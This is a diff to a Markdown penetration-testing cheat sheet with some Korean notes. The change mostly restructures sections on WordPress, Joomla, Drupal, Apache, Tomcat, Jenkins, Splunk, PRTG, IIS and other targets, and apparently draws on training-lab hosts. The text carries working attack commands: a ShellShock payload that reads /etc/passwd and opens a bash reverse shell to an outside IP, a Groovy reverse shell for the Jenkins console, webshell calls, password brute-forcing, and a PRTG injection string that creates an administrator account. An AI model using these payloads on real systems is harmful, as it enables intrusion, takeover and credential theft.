@@ -1155,7 +1155,12 @@ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
 eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
 ```
 
-## Wordpress
+</details>
+
+---
+<details>
+    <summary><strong>Wordpress</strong></summary>
+
 ```bash
 curl http://<wordpress>/robots.txt
 
@@ -1174,6 +1179,7 @@ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token
 
 sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 ```
+
 ### RCE
 - `Appearance > Theme Editor`
 <img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/b72d9500-b5f0-45af-b05f-6485d08a04bf" />
@@ -1181,8 +1187,13 @@ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rocky
 ```bash
 curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 ```
+    
+</details>
 
-## joomla
+---
+<details>
+    <summary><strong>joomla</strong></summary>
+
 ```bash
 curl -s http://dev.inlanefreight.local/ | grep Joomla
 
@@ -1203,8 +1214,13 @@ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/met
 ### RCE
 - `CONFIGURATION > Templates`
 <img width="1461" height="935" alt="image" src="https://github.com/user-attachments/assets/aaf319ac-3d97-461d-a49f-38f09c07685e" />
+    
+</details>
 
-## Drupal
+---
+<details>
+    <summary><strong>Drupal</strong></summary>
+
 ```bash
 curl -s http://drupal.inlanefreight.local | grep Drupal
 
@@ -1260,8 +1276,13 @@ tar cvf captcha.tar.gz captcha/
 ```bash
 curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 ```
+    
+</details>
 
-## Apache
+---
+<details>
+    <summary><strong>Apache</strong></summary>
+
 - `gobuster`를 사용할 때 `/cgi-bin`이 파일로 취급되는 경우가 있어 `/cgi-bin/`를 wordlist에 추가해서 검색.
 ### ShellShock(테스트를 해봐야 취약한지 알 수 있다.)
 ```bash
@@ -1271,8 +1292,13 @@ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' 
 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 ```
+    
+</details>
 
-## TOMCAT
+---
+<details>
+    <summary><strong>TOMCAT</strong></summary>
+
 ```bash
 curl http://app-dev.inlanefreight.local:8080/invalid
 
@@ -1309,8 +1335,13 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 - `http://10.129.204.227:8080/cgi/welcome.bat?&set`
 - `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
 - `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
+    
+</details>
 
-## Jenkins
+---
+<details>
+    <summary><strong>Jenkins</strong></summary>
+
 - `http://jenkins.inlanefreight.local:8000/script`
 ```groovy
 r = Runtime.getRuntime()
@@ -1323,8 +1354,13 @@ int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+    
+</details>
 
-## Splunk
+---
+<details>
+    <summary><strong>Splunk</strong></summary>
+
 - `nmap` 스캔으로 발견됨.
 ```bash
 git clone https://github.com/0xjpuff/reverse_shell_splunk
@@ -1332,35 +1368,60 @@ git clone https://github.com/0xjpuff/reverse_shell_splunk
 tar -cvzf updater.tar.gz splunk_shell/
 ```
 - `Apps > Install app from file`
+    
+</details>
 
-## PRTG Network Monitor
+---
+<details>
+    <summary><strong>PRTG Network Monitor</strong></summary>
+
 - `nmap` 스캔으로 발견됨.
 - `https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/`
 - `setup > account settings > Notifications`
 ```
 test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
 ```
+    
+</details>
 
-## osTicket
+---
+<details>
+    <summary><strong>osTicket</strong></summary>
+
 - `support portal`에서 새로운 티켓을 요청할 수 있으면 기업에서 사용하는 `email`로 생성이 가능할 수 있다.
 <img width="1481" height="534" alt="image" src="https://github.com/user-attachments/assets/d92a174c-3f84-40d4-9215-0fa2a18060be" />
 <img width="1467" height="968" alt="image" src="https://github.com/user-attachments/assets/ae03cd98-18c5-4c8b-aa23-9f3826447f67" />
+    
+</details>
 
-## Gitlab
+---
+<details>
+    <summary><strong>Gitlab</strong></summary>
+
 - `http://gitlab.inlanefreight.local:8081/explore`
 ```bash
 git clone https://github.com/dpgg101/GitLabUserEnum
 
 ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
 ```
+    
+</details>
 
-## ColdFusion(8500)
+---
+<details>
+    <summary><strong>ColdFusion(8500)</strong></summary>
+
 ```bash
 nmap -p- -sC -Pn 10.129.247.30 --open
 ```
 <img width="1005" height="469" alt="image" src="https://github.com/user-attachments/assets/5a7eca71-d4cf-4c5d-94a1-5c155ccebacd" />
+    
+</details>
 
-## IIS
+---
+<details>
+    <summary><strong>IIS</strong></summary>
+
 ### 8.3 format enabled
 ```
 http://example.com/~s
@@ -1386,7 +1447,18 @@ cadaver http://10.10.10.15
 
 help
 ```
+</details>
 
+---
+<details>
+    <summary><strong>magento</strong></summary>
+
+```bash
+wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
+
+php magescan.phar scan:all swagshop.htb
+```
+    
 </details>
 
 ---
